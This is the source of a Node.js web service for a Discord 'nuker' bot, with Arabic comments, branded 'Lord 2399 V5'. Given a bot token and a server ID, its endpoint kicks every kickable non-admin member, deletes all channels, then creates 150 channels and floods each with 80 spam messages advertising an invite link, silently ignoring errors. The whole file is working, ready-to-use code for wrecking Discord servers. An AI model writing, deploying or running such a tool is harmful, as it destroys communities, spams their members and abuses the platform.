const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    
    // تعريف البوت بجميع الصلاحيات الممكنة (Intents)
    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMembers,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);
        
        if (!guild) return res.status(404).send({ status: '❌ السيرفر غير موجود!' });

        res.status(200).send({ status: '⚡ بدأت القوة التدميرية V5!' });

        const name = customName || "Lord 2399 V5";
        const msg = customMsg || "# LORD 2399 V5 ON TOP\nhttps://discord.gg/2399k";

        // قوة مضاعفة x10
        if (action === 'تدمير' || action === 'طرد') {
            const members = await guild.members.fetch();
            members.forEach(m => {
                if (m.kickable && !m.permissions.has(PermissionFlagsBits.Administrator)) {
                    m.kick('2399 Power').catch(() => {});
                }
            });
        }

        if (action === 'تدمير') {
            // مسح الرومات بلحظة واحدة
            const channels = await guild.channels.fetch();
            channels.forEach(ch => ch.delete().catch(() => {}));

            // إنشاء رومات (سرعة جنونية)
            for (let i = 0; i < 150; i++) {
                setTimeout(() => {
                    guild.channels.create({ 
                        name: name, 
                        type: ChannelType.GuildText 
                    }).then(ch => {
                        for(let j=0; j<80; j++) ch.send(msg).catch(() => {});
                    }).catch(() => {});
                }, i * 30); // 30 ملي ثانية فقط!
            }
        }
    } catch (err) {
        console.error("Critical Error:", err.message);
        if (!res.headersSent) res.status(500).send({ status: '❌ فشل الاتصال: تأكد من التوكن والـ Intents' });
    }
});

app.listen(process.env.PORT || 3000, '0.0.0.0');
